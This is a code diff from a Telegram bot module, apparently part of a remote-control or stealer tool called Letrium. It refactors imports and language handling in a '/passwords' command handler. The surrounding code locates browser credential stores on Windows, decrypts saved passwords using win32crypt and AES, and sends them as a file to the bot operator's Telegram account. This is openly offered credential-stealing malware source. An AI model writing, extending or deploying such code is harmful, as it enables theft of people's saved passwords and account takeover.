@@ -19,12 +19,11 @@
 # forked from https://github.com/cybermads/Letrium.git
 # author: cyberman
 
+
 from aiogram import  types, F
 from aiogram.filters import Command
 from aiogram.types import FSInputFile
-from config import ALLOWED_USER_ID
 from Cryptodome.Cipher import AES
-from lib.text.texts import TEXTS, user_languages
 
 import os
 import json
@@ -33,6 +32,10 @@ import sqlite3
 import shutil
 import win32crypt
 import tempfile
+
+from config import ALLOWED_USER_ID
+from lib.text.texts import TEXTS, user_languages
+
 
 LOCAL = os.getenv("LOCALAPPDATA")
 APPDATA = os.getenv("APPDATA")
@@ -91,20 +94,13 @@ def register_password_handler(dp):
     @dp.message(Command("passwords"))
     async def extract_passwords(message: types.Message):
         user_id = message.from_user.id
-        text = message.text.casefold()
-
-        if text == "пароли браузера":
-            lang = 'ru'
-        else:
-            lang = user_languages.get(user_id, 'en')
-
-        texts = TEXTS[lang]
+        lang = user_languages.get(user_id, 'en')
 
         if user_id != ALLOWED_USER_ID:
-            await message.answer(texts["no_access"])
+            await message.answer(TEXTS[lang]["no_access"])
             return
 
-        await message.answer(texts["browser_passwords_start"])
+        await message.answer(TEXTS[lang]["browser_passwords_start"])
 
         res = []
         for browser, base_path in PATHS.items():
@@ -158,7 +154,7 @@ def register_password_handler(dp):
                         os.remove(tmp_db)
 
         if not res:
-            await message.answer(texts["browser_passwords_nothing_found"])
+            await message.answer(TEXTS[lang]["browser_passwords_nothing_found"])
             return
 
         text_lines = []
@@ -178,8 +174,8 @@ def register_password_handler(dp):
                 tmp_file_path = tmp_file.name
 
             await message.answer_document(
-                types.FSInputFile(tmp_file_path, filename=texts["browser_passwords_file_name"]),
-                caption=texts["browser_passwords_file_caption"]
+                types.FSInputFile(tmp_file_path, filename=TEXTS[lang]["browser_passwords_file_name"]),
+                caption=TEXTS[lang]["browser_passwords_file_caption"]
             )
         finally:
             if tmp_file_path and os.path.exists(tmp_file_path):
